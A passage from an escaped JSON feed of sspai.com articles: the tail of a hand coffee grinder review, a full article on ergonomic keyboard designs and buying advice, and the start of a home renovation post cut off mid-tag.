尤其适合在家做手冲咖啡的入门人群，中重度爱好者也可以作为一个外出磨、单品磨来辅佐日常的出品。</p>\n<p>优点：</p>\n<ul>\n<li>可能是手冲磨中性价比「最」高的；</li>\n<li>固定中轴设计，出品省力、稳定；刻度设计清晰、底部提示明显；</li>\n<li>附赠的小刷子、随形袋很好用（但是刷子真的很容易呲）。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>粉盒很难对齐，进而导致很难拧好；手柄要费点心思对准才好安上去；</li>\n<li>标称最多研磨 25g 豆子，实际上放 20g 豆子几乎就满了，更适合家用；</li>\n<li>电商平台上有一些评论反馈粉桶底部突然掉落。</li>\n</ul>\n<h2>彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/3c822f3e3134aee4d8450ff593b7b70a.gif\"><figcaption>惊慌式鼓掌</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/fbaae54b624a7c247bbf54959477f066.gif\"><figcaption><a href=\"https://www.youtube.com/watch?v=r2EechMYSOU&amp;t=1s\" target=\"_blank\">来源</a></figcaption></figure><p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p><strong>当然也 </strong><a href=\"https://mp.weixin.qq.com/s?__biz=MzU4Mjg3MDAyMQ==&amp;mid=2247512957&amp;idx=3&amp;sn=b9778e00d8ec4b5a137b568f15df874c&amp;chksm=fdb34617cac4cf017cb191b863846a0aa455968b76f05959e83461ff8da5ffbe4e76e326abb8&amp;token=1849190743&amp;lang=zh_CN#rd\" target=\"_blank\"><strong>欢迎来少数派上班</strong></a><strong>，让问路哥送你新玩意！</strong></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67402"},{"title":"手腕救星还是烧钱摆件？聊聊人体工学键盘","date":"2021-06-24 07:51:37","description":"\n<h2>一切从 QWERTY 和打字机开始</h2>\n<p>键盘应该是什么样子？</p>\n<p>当我问出这个问题时，你的脑中可能就有了键盘的形状——我将这视为其拥有「通行标准」的表现。键盘上那些字母格错落有致、方方正正，身边大大小小的键盘怎么也逃不出这方格内划线的设计；以至于当我把这方块上所有字符都抹掉，让它变成一块华夫饼，你也能一眼认出来，这是一把键盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/article/9b6b5419df0e2fd45764a6e106298e79\"><figcaption>图源：thekeyboardwaffleiron.com</figcaption></figure><p>1874 年，第一台取得商业成功的打字机 Sholes and Glidden Typewriter，也就是后来名噪一时的 Remington No. 1 上市。Remington 这家一心求变的武器公司显然不会想到，自己买来的新颖专利在日后变成了国际通行的事实标准。C. L. Sholes 和他的同僚发明的 QWERTY 布局随着 Remington 打字机越攀越高的销售，逐渐走向速记员、走向办公室，再一步步走向职业作家和普通家庭。直到后来，IBM 也采用了他们的布局，并把这个布局用在自己大卖的 IBM PC 上，随机的经典键盘 Model M 也就成了几乎所有键盘的布局范本。</p>\n<p>但最通用的不一定就是最好的。当键盘开始跟着电脑一起步入千家万户，成为常见的生产工具时，此前因为使用频度不足而没有凸显的问题被一一提上台面——鼠标手、键盘肘这些互联网时代职业病替代「电报麻痹<sup class=\"ss-footnote\" href=\"\" title=\"电报麻痹，telegraphic paralysis，是电报员长年累月工作后，常用手指疼痛、弹响、无法完成连击等高频动作的疾病，可以笼统地归类为手指屈肌腱鞘炎。现在在各个手指发病也有不同代称，如手柄指、黑莓指、Emacs 指、扳机指等。\" footnote-id=\"1\">1</sup>」，成了每一个桌前办公者不得不面对的痛苦。</p>\n<p>如果我们把标准 QWERTY 的键位与「标准指法」下要求的对应手指相连，会得到这样的图像：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/article/7523a53a496771dba28a17f9623df379\"><figcaption>QWERTY 布局，每种颜色代表一根手指。图源：Wikipedia，有更改</figcaption></figure><p>我们会发现，右手所对应的按键几乎与右手手指自然屈伸的方向平行，但左手手指就需要更大幅度的挪动才能按键。如果想抵抗这种大幅度的左右挪动，就需要把手掌尽可能与键盘垂直，使左手手指的横向移动幅度变小。问题在于，手掌与键盘垂直时，手腕将产生一个明显的夹角，长此以往，损伤会发生在手腕，而这种调整动作还会加重双肩内收的程度，带来更大范围的疲劳。也就是说，如果没有良好的休整、放松习惯，而是长时间不间断工作，随着人体感觉哪里累了调整哪里，最终的结果就是肩、肘、腕、指节从上而下的疲劳，甚至发展成重复性劳损（RSI），不得不接受治疗。</p>\n<h2>人体工学键盘改了哪里？</h2>\n<p>为数众多的使用者开始注意到现有键盘布局的问题，人体工学键盘（ergonomic keyboard）也应运而生。可惜的是，「人体工学」并不是一个能完全量化的属性，所以大部分产品只能在设计上标明自己朝「更符合人体工学」的方向做了改进，它们的评价和使用体验也和使用者的手部尺寸、击键习惯有极大关联；也正是因此，人体工学键盘的市场总是鱼龙混杂，怪招奇招层出不穷。</p>\n<p>我们回到源头——标准键盘的问题基本可以归结在以下几点：手指击键挪移位置较远、左手区不顺应左手指方向、修饰键过多依赖无力的小指。基于这些问题，我个人将人体工学键盘对标准键盘的改造分为三个大方向：</p>\n<ul>\n<li>实际键位修改（视觉/功能布局，visual/functional layout）；</li>\n<li>键盘物理布局修改（physical layout）；</li>\n<li>键盘外形修改。</li>\n</ul>\n<p>一把人体工学键盘可能是三种修改的混合，也可能只采用单独一种思路，但它们的共通点，就是都需要一般的 QWERTY 使用者重新适应，只是适应时长有所区别。</p>\n<h3>从实际键位入手，缩短击键距离</h3>\n<p>一部分人选择从 QWERTY 布局最广为人知的缺陷下手——作为一个为英文服务的布局，QWERTY 并没有将最常用字母直接放置在基准行。具体的原因已经不得而知，坊间传言认为 Sholes 将 QWERTY 如此设计是为了减少打字机敲击杆的相撞概率，但他本人从来没对自己的设计作出解释。至少在它发明的年代，QWERTY 的效率比起字母表自然顺序键位要高出不少。</p>\n<p>因此，有一些发明者以保持现有键盘兼容性的想法为基础，发明了各种键盘布局，其中比较完善、现在也还有不少人使用的，有 1936 年的 Dvorak，2006 年的 Colemak，和 2010 年的 Workman。他们的基本设计思路，就是尽可能让键盘布局满足以下两个特点：</p>\n<ul>\n<li>常用字母尽可能放在基准行；</li>\n<li>保证大多数常用单词输入时左右手交替击键。</li>\n</ul>\n<figure class=\"ss-imgRows\" figcaption=\"左：Dvorak，右：Colemak 图源：Wikipedia\"><img src=\"https://cdn.sspai.com/2021/06/21/0d4fb9cfc04618eab8b8fbdd2b3ca54d.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/21/aae1f18b7b67e6b897b8fa631302e106.png\" alt=\"\"></figure><p>这样的调整可以使手指的运动距离尽可能缩短，减少指关节的屈伸活动幅度，同时不改变键盘的物理布局，只需要改变视觉布局（键盘上印制的字符，legend）或在软件层面上调整功能布局（按下按键后实际输入的字符）即可。据称，单是 Dvorak 这样的改动就可以让英语常用词中 70% 的输入在基准行完成。但由于它们依然沿用现有键盘的基本布局，大拇指这一最有力的手指还是只能按在空格上，在绝大多数时间内休息。因此，有些厂商作出了更为激进的改动：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/article/808fc9107fd8c0b735213dd7d42612be\"><figcaption>Maltron L90 Dual-hand Fully Ergonomic Keyboard，图源官网</figcaption></figure><p>Maltron 布局把英语中最常用的字母「E」放在了左手大拇指的位置——现有的键盘布局显然满足不了这样的需求，Maltron 也不满足于简单的分裂空格，就干脆做了一套完整的新布局。把字母区分拆给左右两手，小键盘中置，大拇指负责空格、E 和一系列常用修饰键，这相当于在键盘布局、键位和键盘外形三点上都做了修改。当然，这样锁定稀有布局的产品注定销量不大，所以他们同时也提供 QWERTY 和 Dvorak 版本，并销售平面和立体两种型号。在一众从键位入手的方案中，Maltron 是最别具一格，也是最激进的那个。</p>\n<p>事实上，Maltron 还同时设计和出售各种便于障碍人群使用的键盘，包括适合完全单手操作的键盘、适合脑性瘫痪等运动障碍人群的键盘以及上肢残疾人群适用的头/口指点键盘。所以在我看来，Maltron 的激进设计更大的意义在于这些更加特殊的键盘，它的 Maltron 双手布局更像是开发过程中的副产品。但无论这个布局是否能推广，我都会对这家公司抱有绝对的敬意。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：单手工学键盘，右：头 - 口指点键盘，图源：Maltron 官网\"><img src=\"https://cdn.sspai.com/2021/06/21/a644ab5ac58c41ad5e28a454c78889ab.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/21/ab4556c8b46e9faa7c431df6d1402433.jpg\" alt=\"\"></figure><h3>从物理布局入手，减少手指用量</h3>\n<p>但对于大多数使用者来说，让他们抛弃自己习惯多年的 QWERTY 布局，成本就有些太高了。因为一旦已经注意到了手腕和手指的疲劳，多半说明使用者在日常生活和工作中已经离不开电脑，根本承担不起切换布局需要的漫长适应期。其次，如果没有键帽上的刻印作为提示，学习新布局的进程可能更加缓慢，但由于市场上配件的缺乏，使用者可能很难找到合适的配件。</p>\n<p>此外，对于非英文使用者，甚至非西文体系使用者来说，由于输入法和基础字元的差异，更换这类软布局可以说收效甚微。相比之下，对键盘本身做硬处理可能更加适宜。</p>\n<p>Kinesis Advantage 是一个在国内小有知名度的人体工学机械键盘型号。尽管采用了与 Maltron 双手类似的设计<sup class=\"ss-footnote\" href=\"\" title=\"据说 Kinesis 曾试图代理 Maltron 并采用 Maltron 布局，在谈判失败后，Kinesis 直接仿照 Maltron 生产了自己的键盘，两个厂商的爱好者也经常发生争论（甚至冲突）。\" footnote-id=\"2\">2</sup>，但他们将重心放在了对物理布局的更改上，在保留 QWERTY 布局的同时，将常用的 Enter、Backspace 等按键分给了更有力也更空闲的大拇指，分散了小指的压力。同时 Kinesis 去掉了两手中间的数字小键盘，让整体更加紧凑<s>，也能再单独赚一份卖小键盘的钱</s>。双手碗状凹陷的设计能尽可能保证手指在击键时不过度屈伸，宽大的掌托也给了使用者足够的休息空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/article/f692d30c920af70b51c324abee091246\"><figcaption>Kinesis Advantage 2，图源：Kinesis 官网</figcaption></figure><p>在这一门类下，还有一些在键盘爱好者中评价不错的项目，比如 ErgoDox 和 X-Bows。他们的整体键盘设计仍然保持了平面，在平衡大拇指工作量的同时，对键盘各按键的排布进行了调整，保证每根手指在按键时只屈伸不偏移。ErgoDox 是一个开源项目，理念非常简单，就是将每根手指应该按的键抻成一纵列；而 X-Bows 的设计者本身是影像科医生，他将布局设计得更加适合手型，每根手指都有自己最适宜的角度，但这样带来的后果就是键帽需要独立开模，自己基本无法更换。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：ErgoDox-EZ，右：X-Bows Nature，图源：官网\"><img src=\"https://cdn.sspai.com/2021/06/21/15d67e99ecddbd50b3c7f4b12b861315.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/21/ea6aa0a8b92cb9b86595e33ba0225a6a.png\" alt=\"\"></figure><p>之前怒喵科技发布的 AM Hatsu 采用的也是类似 ErgoDox 的开源方案，这种 Dactyl Manuform 方案和 ErgoDox 最大的差别就是它将平面的 Ergo 立体化，融合了类 Maltron 和类 ErgoDox 两种方案的优点，缺点也很明显，那就是便宜的亚克力打样外壳 + PCB 工厂产板方案基本无法完成，只能 3D 打印 + 手工飞线，耗时又费力。此外，这类开源项目因为是根据人手调整的，理论上每一个使用者在自制之前都应该对布局进行调整，以适合自己的手型和尺寸，国外论坛有使用轴体过重手指角度过大的成品 ErgoDox 反而导致大拇指腱鞘炎的先例。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/e8d374c946f5233d63b1c0fe6fa6d195.jpg\"><figcaption>Dactyl Manuform，图源 GitHub，见关联阅读</figcaption></figure><p>还有一些人选择了另一条道路：OLKB 出品的直配列键盘 Planck 把整个键盘做成垂直排列，同时砍掉数字区，让键盘上的每一个按键都离基准行只有最远两个键的距离，靠大拇指切层完成其余大部分操作。类似的布局还有砍掉数字区但保留普通错落设计的 40% 键盘，它们都靠大拇指切层来完成被砍掉的键位操作。这种设计相当于保证手指的运动减少，将手腕位置和手臂位置的调整全数交给使用者，毕竟你也要重新习惯这种键盘的输入，不如连摆放姿势也一起重新学——唯一的问题在于，在我个人看来，<strong>这两类键盘都算不上人体工学键盘</strong>，尤其是 Planck 这种直配列（ortholinear）键盘——它会让你的双手靠得更近，并且强行让两只手腕都处在内收状态（向小指方向弯折），甚至可能加速劳损形成。它们更大的意义可能是便携，而不是宣传语中所谓的减小手指压力。至于 40% 键盘，对于中文拼音输入法使用者来说，这样的缩减可能带来更明显的手指疲劳，需要仔细斟酌使用场景。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：Planck-EZ，图源：OLKB；右：40% 配列 AK40，个人拍摄\"><img src=\"https://cdn.sspai.com/2021/06/21/0d3d05ddaa4076a89ebd569fd0e2d7d1.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/21/b66444816731f72be371ef4cb9eb6ea8.jpg\" alt=\"\"></figure><h3>从键盘外形入手，让键盘适应人体</h3>\n<p>对于一般的键盘使用者来说，上述那些设计可能都已经超过了可被接受的学习成本范围。毕竟我们使用了这么多年的标准键盘，如果不是高强度键盘劳工，其实很难下决心抽出那么多精力分给打字这件事。其实也有一类更加温和的人体工学设计来尝试和入门。这类设计几乎只弯折了键盘的外形，维持住了主键区的配列，意在为手腕提供一个更自然的弧度，或是让手臂和手掌在保持一线。这类设计在人体工学的方面考虑其实是折衷的，它默认使用者已经在非工学的键盘上摸索出了一些还算健康的打字方法，但就是这种折衷才能让更多人体验到人体工学设计的乐趣。</p>\n<p>量产键盘中，Mistel 和微软就是比较典型的例子，一个做双手分体，一个做键盘弯折。拼合起来的 Mistel MD600 / Barocco 就是一块平平无奇的 60% / 75% 配列机械键盘，你可以在需要的时候将它分开，甚至只用一半，当成一个单纯的左手键盘——也确实有职业哥把这半块键盘带上赛场的。对于没什么信心适应人体工学键盘，但又心痒痒想体验一把的人来说，Mistel 这种想用的时候能自己调整，不想用的时候能回归平凡的设计可能才是最合适的。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：Mistel Barocco，图源 Mistel 官网；右：微软 Sculpt 人体工学套装键盘，图源微软官网\"><img src=\"https://cdn.sspai.com/2021/06/21/e31257690125de80ed2cbd1f6c3c2874.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/21/691ef2a13245557e94dcfed6ca648878.jpg\" alt=\"\"></figure><p>至于微软的人体工学，则是直接把键盘的外形扭曲，弯成一个比较适合自然状态的手臂与手腕的角度，并且直接装配一个腕托。方法看起来简单粗暴，但确实合用，能在降低学习成本的同时尽可能把键盘一次性调整成最适用的形态。微软的部分型号还附送了磁吸式的抬高撑，能把手腕进一步抬高，避免出现不自然的过伸（手腕向手背方向屈曲）。</p>\n<p>开源项目中，题图所展示的 Alice 配列算是最容易上手适应的布局，它的基本理念也是将 QWERTY 布局弯折成顺应手指的形状，并把左右两半拆开。比起一般的设计，它多加了一个右手 B 键——这也是与「标准指法」相比，有最多人「按错」的键位，因为 B 键在标准键盘上到左右手的距离其实是一样的，这一点点改变就足以让 Alice 的适用人群扩大不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/article/104a7f9457da299de8b16f973db941c7\"><figcaption>Alice 配列，图源：Alice 作者 FateNozomi GitHub，见关联阅读</figcaption></figure><h2>买之前还要怎么挑？</h2>\n<p>说了这么多，还是要兜兜转转地回到购买决策的问题上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/article/e88111838cdd6c5693999b5c06b64aff\"><figcaption>理想打字姿势，图源：Cornell University Ergonomics Web</figcaption></figure><p>我们站立起来，双臂完全放松，垂在身体两侧，然后保持这个姿势转动手肘——此时你的前臂和手掌应当处于一条直线，两手相距略窄于肩，手背斜向前，手指微微屈曲。这就是最理想的人体工学姿势。所以，一把最理想的人体工学键盘，应当「中间拱起，两手分离，同时配有腕托/掌托，而且与你的手指长度相适应」。但很可惜，没有一把键盘能做到这些，你只能根据自己手部的健康情况进行取舍，同时还要考虑人体工学键盘的上手难度，来决定优先满足哪一部分需求。</p>\n<p>就我个人而言，我会<strong>优先保证左右手分离</strong>，这是我在使用工学键盘的过程中体会最深的一点。平面和立体工学的差距不一定很大，但左右手分离后，手腕、肩部、肘部的舒适感增强是立竿见影的。除此之外，如果你选择的是薄膜工学键盘，一定要选择<strong>分裂空格键</strong>的型号：无论是火山口还是剪刀脚，这些常用的薄膜结构都没有办法保证那个弯曲的超大空格键能顺滑运作，如果没有分裂成两个短空格，打字时将有很大机率发生卡涩。</p>\n<p>对于一般的键盘使用者来说，X-Bows 和微软的部分型号都是比较合适的入门选择，前者在平面上给你的手指更多放松，后者则是在立体层面做了一个比较通用的设计，但需要注意的是，微软部分型号是没有分裂空格的，这可能造成使用上的麻烦。如果愿意折腾，可以试试 Alice 布局的键盘，上手相对容易。如果你有更高的使用要求，也可以直接尝试 Kinesis 等更激进的设计，只是要做好以后都适应不了普通键盘的准备。</p>\n<p>如果你已经尝试过人体工学键盘，欢迎在评论区分享你的经验，有什么进一步的问题也欢迎在评论区进行交流。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://ergo.human.cornell.edu/AHTutorials/typingposture.html\" target=\"_blank\">CUergo: Neutral Posture Typing</a></li>\n<li>\n<a href=\"http://xahlee.info/kbd/ergonomic_keyboards_index.html\" target=\"_blank\">Xah Lee - Ergonomic Keyboard Reviews</a>，一位人体工学键盘玩家的博客，内容十分丰富。</li>\n<li>\n<a href=\"https://github.com/abstracthat/dactyl-manuform\" target=\"_blank\">GitHub - abstracthat/dactyl-manuform</a>，Dactyl Manuform 图源，作者项目页面。</li>\n<li>\n<a href=\"https://www.reddit.com/r/MechanicalKeyboards/comments/b4ibc1/%E3%82%A2%E3%83%AA%E3%82%B9_opensource/\" target=\"_blank\">アリス - [Open-source] : MechanicalKeyboards - Reddit</a>，Alice 方案作者介绍帖。</li>\n<li><a href=\"https://sspai.com/post/66918\" target=\"_blank\">东西我都装好了 | 从一张桌到两张桌：我的学习区升级之路</a></li>\n<li><a href=\"https://sspai.com/post/60979\" target=\"_blank\">少数派办公室健康改造计划——人体工学椅篇</a></li>\n<li><a href=\"https://sspai.com/post/64972\" target=\"_blank\">买了 10 多款机械键盘之后，我想聊聊如何找到「完美手感」</a></li>\n<li><a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工的桌面长啥样——键鼠外设用些啥</a></li>\n<li><a href=\"https://sspai.com/post/43432\" target=\"_blank\">「人键合一？」我的人体工学键盘体验和思考</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，探索更有趣的数字生活 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67354"},{"title":"开放空间中的独立，老房子装修思考","date":"2021-06-24 06:25:59","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\" target=\"_blank\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>要想在广州城市中心里的老房子里找到可利用的房型并不容易，我见过三角形的客厅，见过窗都开在北面的房子，也见过暗无天日的天井房。</p>\n<blockquote><p>你也许会惊讶当年是如何设计出这样的户型，但你一定不想住在这样的房子里。</p></blockquote>\n<p>我们最后选择的是一间尚有改造空间的房子，建筑面积 113 平米，套内 92 平米，能够较为宽裕地塞下三房。没有考虑做成四房是因为我们长期 2 个人居住，在未有孩子的情况下，我们更倾向于拥有更多自由空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/96e2b26b64204a306c3affa19dae02c8.jpeg\"></figure><p>不管怎么说，这是属于我和企鹅小姐的第一个家。</p>\n<h2>空间的重新规划</h2>\n<p>房子的原有格局还算得上方正，东南两个方位的阳台都有大窗可以保证一定程度上的采光，但整体上还是存在一些先天的缺陷，需要通过一定的设计来减轻这些缺陷带来的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/bb35f55fc895f2a8443b0a82a5c3cb9b.png\"></figure><h3>房高不足：纵向不足横向弥补</h3>\n<p>房高不足是先天性缺陷，较深的横梁加上我 184 的身高，我可以轻松摸到横梁，这就让屋内视觉空间显得很矮，整体进门感略显压抑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/e995be9f78f20e7b2a7cea76c22add7e.jpeg\"></figure><p>结构上的硬伤很难通过简单的方案解决，为了进一步减少纵向空间的压抑感，我们尽可能在横向面积上保持开阔，让目光扫到更多空间，从而增强宽阔的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/1a14f4553f63d567c8b8d772313bf6fc.jpeg\"></figure><p>因此我们减少了很多视觉拐角和墙，让你一眼可以望穿整个房间，用开放式的厨房、一体式背景的客厅和大面积窗户的阳台来增加这种开阔感，后面我们会具体聊到。</p>\n<h3>餐饮环境：隔绝气味拥抱新风</h3>\n<p>相比起结构上的缺点，环境缺点更为致命，大楼的1-3层出租用于餐饮营业，恰好又遇上这种闹市区网红店，客流量巨大。房屋较老的管道和排污效果不理想，楼下的餐饮废气味不时涌上来。</p>\n<p>解决方法很简单：紧闭门窗。我们选择了双层断桥铝窗户，除了让室内密不透风外，也拥有了超强的隔音能力。</p>\n<blockquote><p>但问题是人要怎么呼吸呢？</p></blockquote>\n<p>唯一的选择只有在吊顶安装新风系统，我们最终选择在厨房吊顶内安装松下的新风系统，350m3/h 的交换量，意味着每一小时可以将全屋的空气置换一次，保持室内较高的含氧量。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/7557f5bdf1d8a951a49632a9f8d9603d.jpeg\"></figure><p>在窗门紧闭的情况下打开着新风系统，人在呼吸时不会感觉到闷，空气中氧气的含量是充足的。但这不意味着新风机可以带来凉爽的风，夏天室内依然十分炎热，你依旧需要打开空调来获得凉爽的环境。</p>\n<p>新风系统在与外界交换的过程中也会带走部分空调的温度，所以空调的制冷功耗相比于平时会略高。</p>\n<p>新风机还有一个好处，长期不开窗只使用新风系统的话，得益于进风口的过滤，家里的灰尘会显著地减少。但其实偶尔开窗感受一下自然的风也会使人心情愉悦。</p>\n<h3>减少厕所：干湿分离多人共用</h3>\n<p>考虑到室内的面积并不富裕，居家长期生活的基本是2个人，主卧多设立一个厕所就显得没有那么必要。但话说回来，家庭中只有一个厕所又无法应付多人同时使用，干湿分离似乎就是最好的空间解决方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/f15343a8752c7e5196a32695bf3dcdd5.jpeg\"></figure><p>我们把原先厕所的空间分为三份，浴室和便池都是独立的空间，洗手盆和镜子在走道上，这意味着可以多人同时使用，一个人洗漱、一个人洗澡和一个人如厕，互不影响相互独立。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/792a421ab9457e391b108a5ee24773a9.jpeg\"></figure><p>独立的洗浴间能减少潮湿环境带来的卫生问题，清洁起来也比以往更加方便，多出来的走到空间也会让家中空间显得更富裕。我非常推荐新屋在有条件的情况下都尽量地做成干湿分离，</p>\n<h2>独立小空间的思考</h2>\n<p>为了让视野更开阔，家里的主要位置都是开放的，这在一定程度上弱化了边界感的存在，所以我们想通过赋予每个区域更多的功能，让它们相互之间彼此分隔，在开放空间中形成“独立空间”。</p>\n<h3>社交属性的开放式厨房</h3>\n<p>我一直都很想拥有一个开放式厨房+小餐厅的家，厨房对我们而言不仅仅是煮菜的地方，更是促进交流和社交的重要区域。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/cc61afe224f9436d4b56a38278b251b1.jpeg\"></figure><h4>充满交流的烹饪，不是一个人的工作</h4>\n<p>传统的厨房更像是工人干活的地方，进去一个人忙活，这是孤独且枯燥的体验。开放式厨房则能把烹饪这件事变得更有交互感，也能在做饭的过程中与家人保持沟通。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/092d22f9c10ca6e507b968b4c5d11658.jpeg\"></figure><p>整个厨房呈现「6」字型空间，除了厨房台面外是一圈小吧台，台面下用于放置柜子和洗衣机。柜子用于收纳一些碗碟和清洁用品，洗衣机的位置因为没有多余空间放置，也只能放在这里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/1b55af1797673d414ee841aaaafc2936.jpeg\"></figure><p>吧台空间足够两个人并排坐或面对面坐，无论是平日里两个人吃饭，还是饮茶喝酒，这里都再合适不过，早餐和晚上的大部分时间里，我喜欢在吧台上使用 iPad 阅读和处理事情，配上一壶茶或冰美式，这是我最喜欢的时刻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/4739641fafddc3fed924d85e5eaa9b09.jpeg\"></figure><h4>开放式带来的问题</h4>\n<p>开放式兼顾了烹饪体验和视觉观感，做饭的油烟是不可避免的。</p>\n<p>为了更好吸收油烟，我们选择了老板的强吸力侧吸式抽油烟机，效果要好于传统样式，加上我们全屋新风机的回风口就在开放式厨房的顶部，能够最大程度限制油烟。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/f84871b52963eecb7d263385dbe9fb7b.jpeg\"></figure><p>这并不意味着就可以完美解决油烟问题，很大程度上，选择开放式厨房还因为我们的饮食习惯不爱高油爆炒，即便是中餐为主，也基本不会出现太大的油烟。</p>\n<h4>厨房的台面高度「关乎家庭地位」</h4>\n<p>厨房台面高度是值得考虑的地方，像我这种和企鹅身高差 30cm 的情况，很难找到一个恰好的高度同时适合两个人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/921e7c7e6416b46a9efb3b416b02a9b0.jpeg\"></figure><p>比较科学的方法是根据下厨时间长短来决定向谁妥协，但实际情况可能是桌子得适合她，碗也还是得我洗。</p>\n<h3>放松心情的小阳台</h3>\n<h4>绿色、阳光和自由</h4>\n<p>这套房子的阳台恰好在东面，连着一排的窗户。二次设计的时候我们就把分隔墙打掉，把两个阳台连在一起纳入了客厅，放置了一颗幸福树，形成较为开阔舒服的公共区域。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/bdf378db5442773ffd2edb627f4d5934.jpeg\"></figure><p>靠东面的窗户采光素来不错，4 楼的平台上住户们种植了许多绿植，站在窗户上往下可以看到一片绿色的海洋。平日里在这做运动和看书都会是一件很惬意的事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/c7155b15640c25449017500b1cb45819.jpeg\"></figure><p>这个区域内除了靠近房间的墙壁上做了一列置物架外，没有其他的收纳空间，我们希望这一片空间里是自由的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/4f5506d2c8c382f189395c3edb0baf2a.jpeg\"></figure><h4>属于猫的一片天地</h4>\n<p>这里同样是我家猫「老钟」的生活乐园，编织藤椅是它最喜欢的窝，窗帘是它躲猫猫的掩体，硕大的白色卫星仓是它的“豪华厕所”。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/24199b7f7189ab110f717437a8c31009.jpeg\"></figure><p>朋友送了一个到顶的猫爬架，可惜老钟似乎是一只陆行猫，不习惯飞天的它根本不碰这个猫爬架，而且它似乎也无法分辨透明半圆卫星仓，每次放上去都两股战战几欲先走，放在阳台这里权当装饰了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/28/f2fc0b023f829c378594a3996dcaf3a6.jpeg\"></figure><h3>可休闲可运动的客厅</h3>\n<h4>一体式背景墙</h4>\n<p>原本的房型布局上比较尴尬，两个房间的门刚好开在了客厅的背景墙处，如果强行装两个普通的门上去就会显得非常突兀难看。</p>\n<figure class=\"image ss-img-wrapper\"><img 